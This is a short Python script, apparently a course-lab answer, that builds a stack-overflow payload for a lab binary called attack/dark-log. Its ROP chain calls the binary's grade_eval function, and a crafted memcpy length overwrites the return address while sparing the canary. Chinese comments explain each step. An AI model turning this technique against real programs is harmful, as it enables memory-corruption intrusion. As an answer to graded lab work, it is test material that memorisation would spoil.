#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

POP_RDI = 0x4018A3   # pop rdi ; ret   （__libc_csu_init 内未对齐 gadget）
RET     = 0x4018A4   # ret             （修正 printf 的栈对齐）
GRADE   = 0x401677   # grade_eval

# ① expression[128]：既是 gets 的输入，也是 memcpy 的源 → 放 ROP 链
chain  = struct.pack("<Q", POP_RDI) + struct.pack("<Q", 4)
chain += struct.pack("<Q", RET) + struct.pack("<Q", GRADE)
expr   = chain + b"A" * (128 - len(chain))

# ② logMsg[128]：填充（会被 gets 覆盖，无所谓）
body   = b"B" * 128

# ③ len = 0xA8 → memcpy 目标 = logMsg + 0xA8 = rbp + 8（返回地址）
body  += struct.pack("<i", 0xA8)

sys.stdout.buffer.write(expr + body)     # 共 260 字节，停手，不碰 canary
